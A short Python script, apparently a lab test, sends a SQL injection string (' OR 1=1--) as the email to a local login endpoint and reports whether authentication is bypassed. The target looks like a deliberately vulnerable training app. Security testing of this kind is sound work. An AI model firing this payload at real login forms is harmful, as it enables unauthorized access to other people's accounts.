import requests

BASE_URL = "http://localhost:3000"

def test_login_bypass():
    print("[*] Testing authentication bypass")

    payload = {
        "email": "' OR 1=1--",
        "password": "anything"
    }

    response = requests.post(
        f"{BASE_URL}/rest/user/login",
        json=payload
    )

    if response.status_code == 200 and "authentication" in response.text.lower():
        print("[!] Possible authentication weakness detected")
    else:
        print("[+] No obvious auth bypass detected")

if __name__ == "__main__":
    test_login_bypass()
